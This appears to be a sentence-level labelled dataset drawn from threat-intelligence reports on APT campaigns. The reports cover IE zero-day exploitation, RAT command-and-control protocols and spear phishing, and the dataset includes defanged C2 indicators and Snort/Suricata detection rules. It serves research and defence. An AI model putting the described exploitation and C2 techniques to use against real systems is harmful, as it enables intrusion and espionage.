] com domain is linked to the java- se [ .	0
] com by shared hosting history at the following IP address : It is unclear why these actors would attack an IP address they were actively using .	0
It 's possible that the attackers wanted to test their botnet 's capability by attacking an IP they were using to gather statistics on the size of the attack .	0
It is also possible that the attackers simply made a mistake and accidentally issued commands to attack their own infrastructure .	0
On Oct. 24 , 2014 , after attacking their own infrastructure , the attackers issued new instructions to their botnet that ceased all attacks .	1
While not conclusive , the evidence presented above shows a link between confirmed APT activity and ongoing DDoS attacks that appear to be designed to silence the Pro Democracy movement in Hong Kong .	0
The evidence does not conclusively prove that the same actors responsible for the DDoS attacks are also behind the observed intrusion activity discussed above – such as Operation Poisoned Hurricane .	0
Rather , the evidence may indicate that a common quartermaster supports both the DDoS attacks and ongoing intrusion activity .	0
In either scenario , there is a clear connection between the intrusion activity documented in Operation Poisoned Hurricane and the DDOS attacks documented here .	0
While the tactics of these activities are very different from a technical perspective , each supports distinct political objectives .	0
Operation Poisoned Hurricane 's objective appeared to have in part been IP theft possibly for economic gain or other competitive advantages .	0
In the DDOS attacks , the objective was to silence free speech and suppress the pro democracy movement in Hong Kong .	0
The Chinese government is the entity most likely to be interested in achieving both of these objectives .	0
This entry was posted in Threat Intelligence , Threat Research and tagged advanced malware , Cybersecurity , malware , zero-day by Ned Moran , Mike Oppenheim and Mike Scott .	0
Bookmark the permalink .	0
On February 11 , FireEye identified a zero-day exploit ( CVE-2014-0322 ) being served up from the U.S. Veterans of Foreign Wars ' website ( vfw [ . ] org ) .	1
We believe the attack is a strategic Web compromise targeting American military personnel amid a paralyzing snowstorm at the U.S. Capitol in the days leading up to the Presidents Day holiday weekend .	0
Based on infrastructure overlaps and tradecraft similarities , we believe the actors behind this campaign are associated with two previously identified campaigns ( Operation DeputyDog and Operation Ephemeral Hydra ) .	0
This blog post examines the vulnerability and associated attacks , which we have dubbed '' Operation SnowMan .	0
'' After compromising the VFW website , the attackers added an iframe into the beginning of the website's HTML code that loads the attacker 's page in the background .	0
The attacker 's HTML/JavaScript page runs a Flash object , which orchestrates the remainder of the exploit .	0
The exploit includes calling back to the IE 10 vulnerability trigger , which is embedded in the JavaScript .	0
Specifically , visitors to the VFW website were silently redirected through an iframe to the exploit at www. [ REDACTED ] .com/Data/img/img.html .	1
The exploit targets IE 10 with Adobe Flash .	0
It aborts exploitation if the user is browsing with a different version of IE or has installed Microsoft 's Experience Mitigation Toolkit ( EMET ) .	1
So installing EMET or updating to IE 11 prevents this exploit from functioning .	0
The vulnerability is a previously unknown use-after-free bug in Microsoft Internet Explorer 10 .	0
The vulnerability allows the attacker to modify one byte of memory at an arbitrary address .	1
The attacker uses the vulnerability to do the following : The attacker uses the Microsoft.XMLDOM ActiveX control to load a one-line XML string containing a file path to the EMET DLL .	1
Then the exploit code parses the error resulting from the XML load order to determine whether the load failed because the EMET DLL is not present .	0
The exploit proceeds only if this check determines that the EMET DLL is not present .	0
Because the vulnerability allows attackers to modify memory to an arbitrary address , the attacker can use it to bypass ASLR .	1
For example , the attacker corrupts a Flash Vector object and then accesses the corrupted object from within Flash to access memory .	0
We have discussed this technique and other ASLR bypass approaches in our blog .	0
One minor difference between the previous approaches and this attack is the heap spray address , which was changed to 0x1a1b2000 in this exploit .	0
Once the attacker 's code has full memory access through the corrupted Flash Vector object , the code searches through loaded libraries gadgets by machine code .	1
The attacker then overwrites the vftable pointer of a flash.Media.Sound ( ) object in memory to point to the pivot and begin ROP .	1
After successful exploitation , the code repairs the corrupted Flash Vector and flash.Media.Sound to continue execution .	0
Subsequently , the malicious Flash code downloads a file containing the dropped malware payload .	1
The beginning of the file is a JPG image ; the end of the file ( offset 36321 ) is the payload , encoded with an XOR key of 0×95 .	0
The attacker appends the payload to the shellcode before pivoting to code control .	0
Then , when the shellcode is executed , the malware creates files '' sqlrenew.txt '' and '' stream.exe '' .	1
The tail of the image file is decoded , and written to these files .	1
'' sqlrenew.txt '' is then executed with the LoadLibraryA Windows API call .	1
As documented above , this exploit dropped an XOR ( 0×95 ) payload that executed a ZxShell backdoor ( MD5 : 8455bbb9a210ce603a1b646b0d951bce ) .	1
The compile date of the payload was 2014-02-11 , and the last modified date of the exploit code was also 2014-02-11 .	0
This suggests that this instantiation of the exploit was very recent and was deployed for this specific strategic Web compromise of the Veterans of Foreign Wars website .	0
A possible objective in the SnowMan attack is targeting military service members to steal military intelligence .	0
In addition to retirees , active military personnel use the VFW website .	0
It is probably no coincidence that Monday , Feb. 17 , is a U.S. holiday , and much of the U.S. Capitol shut down Thursday amid a severe winter storm .	0
The ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to cyber espionage operations .	1
This particular variant called back to a command and control server located at newss [ . ] effers [ . ] com .	1
This domain currently resolves to 118.99.60.142 .	0
The domain info [ .	0
] flnet [ .	0
] org also resolved to this IP address on 2014-02-12 .	0
The info [ .	0
] flnet [ .	0
] org domain overlaps with icybin [ .	0
] flnet [ .	0
] org and book [ .	0
] flnet [ .	0
] org via the previous resolutions to the following IP addresses : We previously observed Gh0stRat samples with the custom packet flag '' HTTPS '' calling back to book [ . ] flnet [ . ] org and icybin [ . ] flnet [ . ] org .	1
The threat actor responsible for Operation DeputyDog also used the '' HTTPS '' version of the Gh0st .	0
We also observed another '' HTTPS '' Gh0st variant connecting to a related command and control server at me [ . ] scieron [ . ] com .	1
The me [ .	0
] scieron [ .	0
] com domain previously resolved to 58.64.199.22 .	0
The book [ .	0
] flnet [ .	0
] org domain also resolved to another IP in the same subnet 58.64.199.0/24 .	0
Specifically , book [ .	0
] flnet [ .	0
] org previously resolved to 58.64.199.27 .	0
Others domain seen resolving to this same /24 subnet were dll [ .	0
] freshdns [ .	0
] org , ali [ .	0
] blankchair [ .	0
] com , and cht [ .	0
] blankchair [ .	0
] com .	0
The domain dll [ .	0
] freshdns [ .	0
] org resolved to 58.64.199.25 .	0
Both ali [ .	0
] blankchair [ .	0
] com and cht [ .	0
] blankchair [ .	0
] com resolved to 58.64.199.22 .	0
A number of other related domains resolve to these IPs and other IPs also in this /24 subnet .	0
For the purposes of this blog , we 've chosen to focus on those domains and IP that relate to the previously discussed DeputyDog and Ephemeral Hydra campaigns .	0
You may recall that dll [ . ] freshdns [ . ] org , ali [ . ] blankchair [ . ] com and cht [ . ] blankchair [ . ] com were all linked to both Operation DeputyDog and Operation Ephemeral Hydra .	1
Figure 1 illustrates the infrastructure overlaps and connections we observed between the strategic Web compromise campaign leveraging the VFW 's website , the DeputyDog , and the Ephemeral Hydra operations .	0
Other tradecraft similarities between the actor ( s ) responsible for this campaign and the actor ( s ) responsible for the DeputyDog/Ephemeral Hydra campaigns include : We observed many similarities from the exploitation side as well .	0
At a high level , this attack and the CVE- 2013-3163 attack both leveraged a Flash file that orchestrated the exploit , and would call back into IE JavaScript to trigger an IE flaw .	0
The code within the Flash files from each attack are extremely similar .	0
They build ROP chains and shellcode the same way , both choose to corrupt a Flash Vector object , have some identical functions with common typos , and even share the same name .	1
These actors have previously targeted a number of different industries , including : The proven ability to successfully deploy a number of different private and public RATs using zero-day exploits against high-profile targets likely indicates that this actor ( s ) will continue to operate in the mid to long-term .	1
This entry was posted in Advanced Malware , Exploits , Targeted Attack , Threat Research , Vulnerabilities and tagged 0day , zero-day by Darien Kindlund , Dan Caselden , Xiaobo Chen , Ned Moran and Mike Scott .	0
Bookmark the permalink .	0
APT3 ( also known as UPS ) , the actors responsible for Operation Clandestine Fox has quietly continued to send waves of spearphishing messages over the past few months .	1
This actor initiated their most recent campaign on November 19 , 2014 targeting multiple organizations .	0
The attacker leveraged multiple exploits , targeting both CVE-2014-6332 and CVE-2014-4113 .	0
CVE-2014-6332 was disclosed publicly on 2014-11-11 and is a Windows OLE Automation Array Remote Code Execution vulnerability .	1
CVE-2014- 4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14 .	1
The use of CVE-2014-6332 is notable , as it demonstrates that multiple classes of actors , both criminal and APT alike , have now incorporated this exploit into their toolkits .	0
Further , the use of both of these two known vulnerabilities in tandem is notable for APT3 .	0
This actor is historically known for leveraging zero- day vulnerabilities in widespread but infrequent phishing campaigns .	0
The use of known exploits and more frequent attacks may indicate both a shift in strategy and operational tempo for this group .	0
The body of the message is below : One Month 's Free Membership for The PLAYBOY ClUB 1080P HD VIDEOS 100,000 PHOTOS 4,000 MODELS Nude Celebrities , Playmates , Cybergirls & More ! Click hxxp : //join.playboysplus.com/signup/ To Get a Free Plus Member Now & Never Miss Another Update .	0
Your Member referrals must remain active .	0
If anyone getting '' Promotion not available '' for 1 month free membership , you might get the issue up to 48 hrs once your membership is expired and make sure to Clear out cookies or use another browser or use another PC .	0
The webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked PowerShell on the affected users ' system to download the below payload : The CVE-2014-6332 exploit code seen in this incident is derived from the code published at http : //www.exploit-db.com/exploits/35230/ , which has also been incorporated in the Metasploit project .	1
After the exploit or script executes , the system downloads install.exe , which has the following metadata : The file install.exe attempts to write two files ( doc.exe and test.exe ) to the hard-coded path '' C : \Users\Public '' , which fails on Windows XP because that path is not present by default .	1
The first dropped file , doc.exe , contains the CVE-2014-4113 exploit and then attempts to execute test.exe with the elevated privileges .	1
These files have the following metadata : These payload files also have interesting PDB debug strings .	0
The most interesting PDB string is the '' 4113.pdb , '' which appears to reference CVE-2014-4113 .	0
This CVE is a local kernel vulnerability that , with successful exploitation , would give any user SYSTEM access on the machine .	1
The malware component , test.exe , uses the Windows command '' cmd.exe '' /C whoami '' to verify it is running with the elevated privileges of '' System '' and creates persistence by creating the following scheduled task : When executed , the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913 .	1
The malware sends the SOCKS5 connection request '' 05 01 00 '' and verifies the server response starts with '' 05 00 '' .	1
The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command '' 05 01 00 01 c0 b8 3c e5 00 51 '' and verifies that the first two bytes from the server are '' 05 00 '' ( c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order ) .	1
Once the connection to the server is established , the malware expects a message containing at least three bytes from the server .	1
These first three bytes are the command identifier .	0
The following commands are supported by the malware : On October 28 , we observed APT3 sending out spearphishing messages containing a compressed executable attachment .	1
The deflated exe was a variant of the same downloader described above and connected to 198.55.115.71 over port 1913 via SOCKS5 proxy .	1
The secondary payload in that case was detected as Backdoor.APT.CookieCutter ( aka Pirpi ) and also named newnotepad.exe ( MD5 8849538ef1c3471640230605c2623c67 ) and connected to the known APT3 domains : The 192.184.60.229 IP address seen in this current campaign also hosts securitywap [ .	1
] com – another known domain referenced in our Operation Clandestine Fox blog .	0
In addition , the join.playboysplus [ .	0
] com exploit and payload delivery site resolves to 104.151.248.173 .	0
This IP has hosted other domains used by APT3 in past campaigns : As we discussed in our previous blog detailing previous APT3 activity , the walterclean [ . ] com served as a Plugx/Kaba command and control server .	1
Although APT3 is well known for employing zero-day exploits in their attacks , recent activity has demonstrated that they will also attack targets with known exploits or social engineering .	1
Since Operation Clandestine Fox , we have observed this actor execute multiple attacks that did not rely on zero-day exploits .	0
The combination of this sustained operational tempo and lack of zero-day exploits may indicate that this group has changed strategy and has decided to attack more frequently and does not have steady access to zero-day exploit code .	0
No matter the strategy , this actor has shown an ability to operate successfully .	0
IOCs for this threat can be found here .	0
By Dan Kelly and Tom Lancaster It 's every malware analyst 's dream to be handed a sample which is , so far , unnamed by the AV community - especially when the malware in question may have links to a well - known APT group .	0
In my line of work I analyse several ' unknown ' malware samples a week , but often it turns out that they are simply new variants of existing malware families .	0
Recently I was fortunate enough to be handed something that not only had a low detection rate but , aside from heuristics , seemed to be relatively unknown to the top 40 anti - virus companies .	0
In this post I will walk you through the malware family we 've dubbed " OrcaRAT " .	0
First of all , it is worth pointing out that most of the malware I see on a day - to - day basis is espionage orientated , and very rarely do the programmers and operators make much effort to cover their tracks .	0
The use of forged HTTP headers is a common occurrence and simple mistakes within these headers are frequent .	0
The malware in question was handed to me by one of our threat intelligence analysts who was hunting through infrastructure associated with some samples of Comfoo[1 ] malware and happened across a malware sample ( 253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613 ) he did n't recognise .	0
He immediately took the malware and passed it through first stage analysis , which involves running the file in a sandbox environment .	0
After this , he handed it over for more in - depth capability analysis .	0
The structure I began by looking over the sandbox report .	0
The first thing that drew my attention was the URI structure .	0
( A screenshot showing the HTTP headers and URI structure that OrcaRAT produces ) To those of us who are familiar with decoding data , you will notice that the URI string formatting appears to be a modified version of the Base64 algorithm .	0
To understand this structure more , we must reverse engineer the functions that generate and then encode the data .	0
Firstly we begin by analysing the routines that produce the data which is later encoded and sent in the HTTP URI field .	0
The very first thing that jumped out when disassembling the malware is the simplicity and cleanliness of the code .	0
There are also a significant number of Windows Crypto API[2 ] functions imported by the malware , so we can assume this indicates that it uses encryption .	0
( A screenshot showing the functions that are imported by OrcaRAT ) Delving deeper in to the disassembly , we come across the preamble to the URI generation function .	0
( A screenshot showing the decoding and generation of a string value ) The function above uses Windows crypto API to generate a random number of 6 bytes , then dynamically builds and appends the word " OrcaKiller " on to the end of this number .	0
In one such example the final product was " \x61\xBA\xF4\x44\x52\xF1OrcaKiller " ( where \x denotes hexadecimal values ) .	0
Once this value has been produced , the malware begins constructing the URI .	0
With many pieces of malware the initial communications that it sends out to its command and control server ( known as beaconing or phoning home ) usually include pieces of information about the victim system .	1
OrcaRAT is no exception .	0
The randomly generated values noted above are actually used to encrypt several pieces of information that are extracted from the system , and even the key itself is included .	1
( A screenshot showing an encryption function used by OrcaRAT ) All of the values extracted from the system are encrypted using the RC4[3 ] algorithm and then base64 encoded .	0
The RC4 encryption key is derived from an MD5 hash[4 ] of the randomly generated bytes concatenated with the ' OrcaKiller ' string .	0
Once the data has been encrypted it is base64 encoded .	0
Any forward slashes in the base64 string are replaced with a tilde - pseudo code is shown below .	0
Once all of the values have been encrypted and formatted the URI has the following structure .	0
( A screenshot showing the URI structure of OrcaRAT command and control activity ) The campaign ID value is constructed using a method similar to that for the encryption key .	0
( A screenshot showing the generation of the first hidden string value ) It would appear that the authors did not want anybody to be able to easily see this value .	0
This now gives us OrcaKiller and wHaLe .	0
It would appear that our adversary has a salty sense of humour .	0
Command and control As with all malware , the command and control functions reveal the true nature and intent of the operators .	0
Up until now we have only determined how the malware communicates with the server .	0
We will now investigate the mechanisms that the server uses to communicate and interact with the victim .	0
The command and control routine in OrcaRAT appears to serve two purposes .	0
Interestingly these routines are split in to two branches .	0
Each branch of command and control activity is determined by the unique response from the remote server .	0
Command and control takes form of a webpage .	0
Unlike malware designed by the well - known Comment Crew[5 ] , this group does not hide these commands in HTML comments , but instead places them in plain view .	0
The first set of commands force the malware to behave as a simple downloader .	1
( A screenshot showing OrcaRAT parsing the HTML code behind a webpage ) Upon downloading the webpage from the server the malware looks for specific sets of HTML tags .	0
The first set are < P > and the terminating tag < /P>.	0
Once the malware has found these tags it drops in to the first command and control function .	0
The malware then extracts the payload text between the HTML tags and runs it through a decryption routine .	0
The same encryption key that is sent in the URI string is used to decrypt the text .	0
Once the payload text has been decrypted the malware treats this as a binary executable file , which is then written to the disk and executed .	1
The second set of HTML tags allows the operator to drop the malware in to a set of remote control functions .	0
This time the malware searches for the < H1 > tag that is terminated by < /H1>.	0
Once the payload text between these tags has been extracted it is then decrypted using the encryption key found in the URI string .	0
The payload text from this page is much smaller and ultimately points to the command function that the operator has executed .	0
( A screenshot showing the structure of the command and control routines within OrcaRAT ) The command and control structure is fairly simplistic but provides the operator with access to the victim machine 's filesystem and command line , and as such allows the attacker to perform various tasks such as executing arbitrary commands or uploading and downloading files from the compromised system .	1
After a command and control message is received , OrcaRAT sends an HTTP POST message back to the command and control server .	1
Each time that the URI is built it generates a new encryption key , showing that the command and control server is at least serving dynamic content .	0
Given the command structure above , it is logical to assume that the command and control server requires an operator to manually issue specific commands to the victim workstation , with the default command likely being ' sleep ' .	0
Given the information above we can reasonably assume that this malware was most likely designed as a first stage implant .	1
History has shown that malware designed in this way is usually done so to allow the operator an initial level of access to the compromised system , usually for surveying the victim and then deciding whether to deploy a more capable and valuable second stage malware implant .	0
Detection Once OrcaRAT has been delivered to a victim system there are a number of ways to detect it .	0
Firstly we will cover disk detection using Yara .	0
The rule below will detect an OrcaRAT binary executable that has been written to a compromised machine 's disk .	0
OrcaRAT can also be detected in two separate ways at the network level using a Snort or Suricata IDS rule .	0
Detecting malware at different stages of connectivity can be important .	0
By creating signatures with a nexus to the kill chain[6 ] we can determine which stage the intrusion has reached .	0
The two signatures below will indicate whether the intrusion has reached the command and control or action - on phases .	0
Snort .	0
alert tcp any any - > any any ( msg:"::[PwC CTD ] : : - OrcaRAT implant check - in " ; flow : established , from_client ; urilen : 67<>170 ; content:"User - Agent : Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET CLR 2.0.50727\ ; .NET CLR 3.0.04506.30\ ; .NET4.0C\ ; .NET4.0E ) " ; http_header ; content:"GET " ; http_method ; pcre:"/^\/[A - Za - z0 - 9+~= ] { 14,18}\/[A - Za - z0 - 9+~=]{33,38}\/[A - Za - z0 - 9+~=]{6,9}\/[A - Za - z0 - 9+~=]{5,50}\/[A - Za - z0- 9+~=]{5,50}$/U " ; sid : YOUR_SID ; rev:1 ; ) alert tcp any any - > any any ( msg:"::[PwC CTD ] : : - OrcaRAT implant C2 confirmation response " ; flow : established , from_client ; urilen : 67<>170 ; content:"User - Agent : Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET CLR 2.0.50727\ ; .NET CLR 3.0.04506.30\ ; .NET4.0C\ ; .NET4.0E ) " ; http_header ; content:"POST " ; http_method ; pcre:"/^\/[A - Za - z0 - 9+~= ] { 14,18}\/[A - Za - z0 - 9+~=]{33,38}\/[A - Za - z0 - 9+~=]{6,9}\/[A - Za - z0 - 9+~=]{5,50}\/[A - Za - z0- 9+~=]{5,50}$/U " ; sid : YOUR_SID ; rev:1 ; ) Suricata .	0
alert http any any - > any any ( msg:"::[PwC CTD ] : : - OrcaRAT implant check - in " ; flow : established , from_client ; urilen : 67<>170 ; content : " Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET CLR 2.0.50727\ ; .NET CLR 3.0.04506.30\ ; .NET4.0C\ ; .NET4.0E ) " ; http_user_agent ; content:"GET " ; http_method ; pcre:"/^\/[A - Za - z0 - 9+~= ] { 14,18}\/[A - Za - z0 - 9+~=]{33,38}\/[A - Za - z0 - 9+~=]{6,9}\/[A - Za - z0 - 9+~=]{5,50}\/[A - Za - z0- 9+~=]{5,50}$/U " ; sid : YOUR_SID ; rev:1 ; ) alert http any any - > any any ( msg:"::[PwC CTD ] : : - OrcaRAT implant C2 confirmation response " ; flow : established , from_client ; urilen : 67<>170 ; content : " Mozilla/4.0 ( compatible\ ; MSIE 8.0\ ; Windows NT 5.1\ ; Trident/4.0\ ; .NET CLR 2.0.50727\ ; .NET CLR 3.0.04506.30\ ; .NET4.0C\ ; .NET4.0E ) " ; http_user_agent ; content:"POST " ; http_method ; pcre:"/^\/[A - Za - z0 - 9+~= ] { 14,18}\/[A - Za - z0 - 9+~=]{33,38}\/[A - Za - z0 - 9+~=]{6,9}\/[A - Za - z0 - 9+~=]{5,50}\/[A - Za - z0- 9+~=]{5,50}$/U " ; sid : YOUR_SID ; rev:1 ; ) Appendix A : Samples of Orca RAT .	0
Appendix B : Related indicators	0
In mid - July of this year , we noticed yet another legitimate website had been compromised by APT actors and was serving malware .	0
In this case , it was a group commonly referred to as " Nitro , " which was coined by Symantec in its 2011 whitepaper .	0
As we dug deeper , we found additional compromised legitimate websites and malware from the same group back through March of this year .	0
In most instances , the malware is one commonly referred to as " Spindest , " though we also found " PCClient " and " Farfli " variants in use by the group .	0
We do n't have enough data to say for certain that all of the malware in this blog was delivered via compromised legitimate websites .	0
Historically , Nitro is known for targeted spear phishing campaigns and using Poison Ivy malware , which was not seen in these attacks .	0
Since at least 2013 , Nitro appears to have somewhat modified their malware and delivery methods to include Spindest and legitimate compromised websites , as reported by Cyber Squared 's TCIRT .	0
Our findings indicate they are continuing to evolve with the addition of PCClient and Farfli variants .	0
The Maltego screenshot below shows the activity we describe in this blog .	0
These events impacted at least the following industries , across four waves .	0
A US based IT Solutions provider ; The European office of a major , US based commercial vendor of space imagery and geospatial content ; A European leader in power technologies and automation for utilities and industry ; A US based provider of medical and dental imaging systems and IT solutions .	0
In July , Nitro compromised a South Korean clothing and accessories manufacturer 's website to serve malware commonly referred to as " Spindest . " Of all the samples we 've tied to this activity so far noted in this blog , this is the only one configured to connect directly to an IP address for Command and Control ( C2 ) .	0
This IP address has been in use by this group for some time , which is interesting since they have evolved other components of their kill chain over time to ensure malware delivery , but oddly not altered their C2 infrastructure .	0
It is simple for companies to block any outbound traffic to this IP , which would negate the effort Nitro put into successfully delivering the malware .	0
37 AV vendors within VirusTotal properly identify it , and the PE timestamp shows the day before we saw it .	0
In addition , the following three samples were found roughly a week apart from each other , possibly indicating the timing of the waves of activity .	0
Table 1 The next sample we found is commonly known as PCClient , which is not malware previously tied to this group .	0
We discovered this , and many of the following samples , through historic IP resolution overlap between the same domains alternately resolving to either the 223.25.233.248 or 196.45.144.12 .	0
The second IP has also not been reported as tied to this group before .	0
However , this shifting of IP resolutions back and forth indicates Nitro is in control of these domains .	0
It also makes is fairly easy for any Infosec team to reach the same conclusion we did , which again negates their use both of a previously unreported domain and IP for C2 , as well as a new family of malware .	0
25 AV vendors within VirusTotal properly classify this sample as malware .	0
Its PE timestamp was 8 July , almost a week prior when we first saw it .	0
Table 2 The next sample was another Spindest variant and had the same timestamp as the aforementioned PcClient sample .	0
In addition , Nitro chose to use the same C2 for this sample , making it easy to both find and tie to the group .	0
41 AV vendors within VirusTotal properly classify this sample as malware .	0
Table 3 The next wave of activity we found took place in mid - May .	0
Both samples were Spindest variants with the same PE timestamp of 15 May.	0
While neither MD5s for C2 match , the aforementioned link to a post by Cyber Squared 's TCIRT did document Nitro using Spindest variants with the same file name starting late December last year .	0
In that case they used the historic C2 IP we note in Table 1 in this blog .	0
34 AV vendors within VirusTotal properly classify the first sample as malware , and 40 AV Vendors the second sample .	0
Table 4 Table 5 The malware dropped was configured to use good.myftp[.]org as the C2 URL , and the IP resolution was 223.25.233.248 .	1
Both of these are known Nitro Indicators of Compromise ( IOCs ) .	0
In this case , the malware was a Farfli variant , again not a malware previously tied to this group .	0
39 AV vendors within VirusTotal properly identify the file as malware .	0
The PE timestamp on the file was 1 April , about two weeks before we saw the file .	0
Continuing the activity , we discovered the actors had compromised a legitimate website belonging to an international technology company that provides Software Configuration and Change Management ( SCCM ) solutions in mid - May .	0
( It is a well regarded company and partners with large companies such as Microsoft . ) Table 6 The final sample , from mid - March , was also hosted on a compromised legitimate website , this time a small , US based IT company .	0
The IP resolved by the C2 URL was changed two days after we saw this file to overlap with good.myftp[.]org for a month before returning the below resolution .	0
The filename matches that of the sample in Table 5 , which had a very similar third level C2 domain and the same IP resolution .	0
This is also a Spindest variant with a PE timestamp of the same day we saw it .	0
39 AV vendors within VirusTotal properly identify the file as malware .	0
Table 7 As this post and previous cited research show , APT groups such as Nitro will continue to evolve their techniques within the kill chain to avoid detection .	1
However , they also demonstrate the value of tracking these threats over time , as this allowed us to uncover and properly attribute the new IOCs because Nitro was still re - using old C2 infrastructure with their new malware .	1
For Palo Alto Networks customers , all of these files were properly identified by WildFire as malware and all of the C2 domains are labeled as threats in both Threat Prevention and URL Filtering systems .	0
Cyber espionage has been a hot topic through the last years .	0
Computer attacks known as '' APT '' ( Advanced Persistent Threat ) have become widely reported and emphasized by the media , damages are now considered as real and strategic trends are moving in cyber defense .	0
AIRBUS Defence & Space – CyberSecurity unit responds to such attacks for its customers every day , developing a complete range of solutions .	0
Today , we decided to release publicly information on a specific group of APT attackers known as '' Pitty Tiger '' .	0
This information comes directly from investigations led by our Threat Intelligence .	0
Pitty Tiger is a group of attackers that have been active since at least 2011 .	0
They have targeted private companies in several sectors , such as defense and telecommunications , but also at least one government .	0
We have been able to track down this group of attackers and can provide detailed information about them .	0
We were able to collect and reveal their '' malware arsenal '' .	0
We also analyzed their technical organization .	0
Our investigations indicate that Pitty Tiger has not used any 0day vulnerability so far , rather they prefer using custom malware , developed for the group 's exclusive usage .	0
Our discoveries indicate that Pitty Tiger is a group of attackers with the ability to stay under the radar , yet still not as mature as other groups of attackers we monitor .	0
Pitty Tiger is probably not a state-sponsored group of attackers .	0
They lack the experience and financial support that one would expect from state-sponsored attackers .	0
We suppose this group is opportunistic and sells its services to probable competitors of their targets in the private sector .	0
We have been able to leverage several attackers profiles , showing that the Pitty Tiger group is fairly small compared to other APT groups , which is probably why we saw them work on a very limited amount of targets .	0
At the end of this report , we provide indicators of compromise to help people detect current Pitty Tiger attacks .	0
APT attacks follow what we call the '' APT kill chain '' .	0
The kill chain describes briefly the way attackers do perform their actions .	0
It can be summarized by the following scheme : The reconnaissance phase commences when an attacker selects a new target and involves the acquisition of information about that target .	0
There is very little information available about this phase , and there is little data about it .	0
The only way to collect information about this phase would be to already monitor all attackers ' actions at this step , which is hardly feasible .	0
The longer the attackers spend time in attempting to understand their target and its online presence , the easier it will be to find efficient ways to penetrate that company 's systems .	0
This reconnaissance phase is both about finding information to break into the targeted network successfully and about searching for data which could help to accelerate sensitive information isolation ( like the name of a key employee for example ) .	0
This phase mostly relies on open sources from the Internet : social networks , press releases , white papers , corporate websites , search engines , but also on some active tools like vulnerability scanners etc .	0
At this stage , the APT attackers have a solid knowledge of their target and its key employees .	0
The attackers have everything they need to start looking for an entry point to the company 's network and establish one or several permanent backdoors into the environment .	1
The attackers mostly rely on two techniques here to infect one or several computers , usually workstations , inside the target 's network : spear phishing and drive-by downloads .	1
Spear phishing can be described as targeted e-mail phishing .	1
In a spear phishing scheme , attackers send very few e-mails to targeted people .	1
In fact , they can even send just a single e-mail .	0
The trick is to target the right victim and provide it with the right content , so that they will click on a link leading to drive-by download of a malware , or open an attached file which will infect their computer .	1
Some groups of attackers also use '' watering hole '' techniques to successfully compromise their targets .	1
To build a watering hole attack , attackers do compromise the website of a third party , generally a supplier of the target , which is typically visited by a specific group of professionals and very likely by the target .	1
Every visitor of the compromised third party is then infected .	1
The method has one major drawback : it will also infect third parties who visit the website .	0
Attackers have developed ways to avoid this .	0
If their reconnaissance phase has been done effectively , they already know all IP ranges used by the target company .	0
It just takes a few lines of code in the infecting script to only compromise visitors coming from the target IP ranges .	1
Direct attacks against servers of the target can also be a way to penetrate the target 's network .	0
Attackers have gained access to one or several machines inside the target 's corporate network .	1
They need to install several different backdoors in order to be able to always access the network .	1
In case one backdoor falls , there will be others .	0
As soon as the attackers are sure they have enough access , they start looking for two things : intellectual property ( or anything else they want to know or steal ) in alignment with predefined mission objectives , and a means of privilege escalation to facilitate lateral movement within the compromised environment .	1
It generally does not take long before the attackers gain domain administrator privileges and dump all the Active Directory content .	1
They use lateral moves between machines inside the network , and look for everything they need .	0
This step is very hard to detect , since they only use valid credentials and legitimate administration tools such as PsExec .	0
Data exfiltration is the last step before the attackers loop to the lateral moves step , in a never-ending circle of prolonged access and information theft .	1
They generally create archive files containing the content they want to exfiltrate , which are then sent to the attackers by using a remote administration tool ( RAT ) or transfer protocols such as FTP and HTTP .	1
This phase is not the end of an APT attack .	0
The attackers loop to the access strengthening/lateral moves stage and generally keep stealing more information and stay inside the network for more data gathering .	1
For more information about all the APT phases , please refer to our APT Kill Chain blog post serie .	0
During our regular investigations on APT cases , one particular variant of malware caught our attention , because we had not faced it before .	0
We decided to spend some time to investigate around this malware and found out that it was used exclusively by a single group of attackers .	0
This malware family is known as '' PittyTiger '' by the anti-virus research community .	0
We discovered this malware sample in June 2014 , leading to a command & control ( c & c ) server still in activity .	1
Our researches around this particular malware family revealed the '' Pitty Tiger '' group has been active since 2011 , yet we found other publications which could probably be attributed to the same group of attacker back in 2010 .	0
This group uses other malware and tools during their APT operations , in addition to the PittyTiger RAT .	0
A variant of the infamous Gh0st RAT dubbed '' Paladin '' has been used repeatedly by the PT group , together with other RATs which seem to be developed exclusively for the PT group : '' MM RAT '' ( aka Troj/Goldsun-B ) , and '' CT RAT '' .	0
Another variant of Gh0st RAT named '' Leo '' has been found inactive on a c & c server .	0
We also found another malware , named '' Troj/ReRol.A '' .	0
This one is also used by the group to infect workstations , collect system information , and install more malware on the infected computer .	1
It acts as a first stage downloader and system data collector often used in the initial compromise of the Pitty Tiger campaigns , generally embedded in Microsoft Office documents .	1
Thanks to server 's misconfigurations , we managed to get information from three c & c servers used by this group of attackers , which provided us with insight from the end of 2013 to the beginning of July 2014 .	1
Our investigation has been focused on the data we could get from these c & c servers but also on the Pitty Tiger environment .	0
This whitepaper aims to expose the view we have on the group , especially on their infrastructure and capabilities .	0
We hope this publication will bring further counter analysis from the research community to enrich the global common threat knowledge .	0
Pitty Tiger , like most other APT groups , use spear phishing e-mails extensively in order to gain an initial foothold within the targeted environment .	1
We have been able to find a spear phishing e-mail crafted by the attackers .	1
This e-mail spoofed the identity of an employee of a targeted company : The attached file is a Microsoft Office Word document triggering CVE-2014-1761 to infect the computer it is sent to : While this example looks very '' amateur '' for a spear phishing attempt , we suppose the group has conducted more advanced spear phishing campaigns , based on the fact that we found infected Word documents showing content stolen from victims of the group .	1
These documents were infecting the system with Troj/ReRol.A malware , which we will detail later in this report .	1
This could mean that the Pitty Tiger group is using stolen material as spear phishing content either to target other persons in the compromised company , or to target other persons in a competitor's company , or more generally to compromise another target .	1
Pitty Tiger also seem to use fake Microsoft Office Excel content , yet we could only find empty content delivering once again the Troj/ReRol.A malware .	1
